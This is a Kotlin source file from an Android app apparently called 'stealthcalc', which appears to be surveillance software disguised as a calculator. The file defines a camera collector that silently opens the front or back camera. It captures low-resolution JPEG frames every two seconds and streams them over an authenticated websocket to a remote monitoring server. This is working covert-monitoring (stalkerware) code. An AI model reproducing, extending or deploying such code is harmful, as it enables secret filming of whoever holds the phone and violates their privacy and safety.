package com.stealthcalc.monitoring.collector

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.ContextCompat
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import io.ktor.client.HttpClient
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.plugins.websocket.WebSockets
import io.ktor.client.plugins.websocket.webSocket
import io.ktor.websocket.Frame
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class LiveCameraCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private val scope = CoroutineScope(Dispatchers.IO)
    private var streamJob: Job? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    val isStreaming: Boolean get() = streamJob?.isActive == true

    @Suppress("MissingPermission")
    fun startStreaming(useFrontCamera: Boolean, intervalMs: Long = 2000L) {
        if (streamJob?.isActive == true) return
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) !=
            PackageManager.PERMISSION_GRANTED) return

        val baseUrl = repository.serverUrl.trimEnd('/')
        if (baseUrl.isBlank() || !repository.isPaired) return

        cameraThread = HandlerThread("LiveCamera").apply { start() }
        cameraHandler = Handler(cameraThread!!.looper)

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val facing = if (useFrontCamera) CameraCharacteristics.LENS_FACING_FRONT
        else CameraCharacteristics.LENS_FACING_BACK
        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
            cameraManager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == facing
        } ?: return

        val width = 320
        val height = 240
        val reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
        imageReader = reader

        val openLatch = CountDownLatch(1)
        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                    addTarget(reader.surface)
                }
                camera.createCaptureSession(
                    listOf(reader.surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            session.setRepeatingRequest(request.build(), null, cameraHandler)
                            openLatch.countDown()
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            camera.close()
                            openLatch.countDown()
                        }
                    },
                    cameraHandler
                )
            }
            override fun onDisconnected(camera: CameraDevice) { camera.close(); openLatch.countDown() }
            override fun onError(camera: CameraDevice, error: Int) { camera.close(); openLatch.countDown() }
        }, cameraHandler)

        if (!openLatch.await(5, TimeUnit.SECONDS)) return

        val wsUrl = baseUrl.replace("http://", "ws://").replace("https://", "wss://")
        val side = if (useFrontCamera) "front" else "back"
        val client = HttpClient(OkHttp) { install(WebSockets) }

        streamJob = scope.launch {
            runCatching {
                client.webSocket("$wsUrl/camera/$side/${repository.deviceId}?token=${repository.authToken}") {
                    while (isActive) {
                        delay(intervalMs)
                        val image = reader.acquireLatestImage() ?: continue
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        send(Frame.Binary(true, bytes))
                    }
                }
            }.onFailure { e ->
                AppLogger.log(context, "[agent]", "Camera stream error: ${e.message}")
            }
            client.close()
        }

        AppLogger.log(context, "[agent]", "Live camera ($side) started at ${width}x${height}")
    }

    fun stopStreaming() {
        streamJob?.cancel()
        streamJob = null
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
    }
}
